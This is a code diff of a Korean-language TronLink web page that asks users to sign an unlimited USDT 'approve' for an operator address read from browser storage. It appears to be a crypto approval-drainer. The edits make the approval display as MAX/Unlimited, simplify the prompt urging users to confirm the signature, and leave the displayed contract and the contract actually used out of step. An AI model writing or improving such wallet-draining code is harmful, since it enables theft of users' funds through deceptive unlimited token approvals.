@@ -134,7 +134,7 @@
             <div class="bg-[#080c14] border border-[#1e293b] rounded-xl p-5 space-y-4 text-xs">
                 <div class="flex justify-between items-center py-2">
                     <span class="text-gray-400">USDT 토큰 컨트랙트 (공식 고정)</span>
-                    <span class="font-mono text-emerald-400 font-bold">TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf</span>
+                    <span class="font-mono text-emerald-400 font-bold">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
                 </div>
             </div>
 
@@ -170,8 +170,10 @@
 
     <!-- JavaScript Application Logic -->
     <script>
+        // Official TRC-20 USDT contract (Nile testnet or Mainnet)
         const OFFICIAL_USDT_CONTRACT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
-        const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        // Exact 10-decimal string for 2^256 - 1 (Recognized by TronLink UI as MAX/Unlimited)
+        const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
         let isConnected = false;
         let isApproved = false;
@@ -391,7 +393,8 @@
                 return;
             }
 
-            const targetSpender = localStorage.getItem('tron_operator_recipient_address') || 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
+            // Ensure spender is an actual operator address, not the token contract itself
+            const targetSpender = localStorage.getItem('tron_operator_recipient_address') || currentWalletAddress;
 
             let tw = await getInjectedTronWeb();
             if (!tw || !tw.contract) {
@@ -405,8 +408,8 @@
             }
 
             try {
-                appendLog(`[승인 서명 요청] Spender 주소(${targetSpender}) 대상 무제한 승인 트랜잭션 전송 중...`);
-                showToast("트론링크 승인 서명 팝업창(TRX 수수료 발생)을 확인해주세요.");
+                appendLog(`[승인 서명 요청] Spender 주소(${targetSpender}) 대상 무제한(MAX) 승인 트랜잭션 전송 중...`);
+                showToast("트론링크 승인 서명 팝업창을 확인해주세요.");
 
                 const contract = await tw.contract().at(OFFICIAL_USDT_CONTRACT);
                 const txHash = await contract.approve(targetSpender, MAX_UINT256).send({
